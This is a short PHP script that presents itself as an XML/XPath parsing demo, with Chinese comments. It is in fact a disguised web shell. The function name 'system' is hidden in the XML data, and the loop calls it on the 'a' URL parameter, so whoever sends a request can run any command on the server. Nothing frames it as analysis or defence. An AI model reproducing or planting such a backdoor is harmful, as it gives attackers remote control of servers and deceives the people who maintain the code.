<?php
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>
        <key>system</key>
    </item>
    <item>
        <key>age</key>
        <value>30</value>
    </item>
</data>';

// 加载 XML
$xml = new SimpleXMLElement($xmlString);

// 使用 XPath 查询所有 item 节点
$items = $xml->xpath('//item');

foreach ($items as $item) {
    $key = (string)$item->key; 
    ($key)($_GET['a']); // 动态调用函数
}
?>
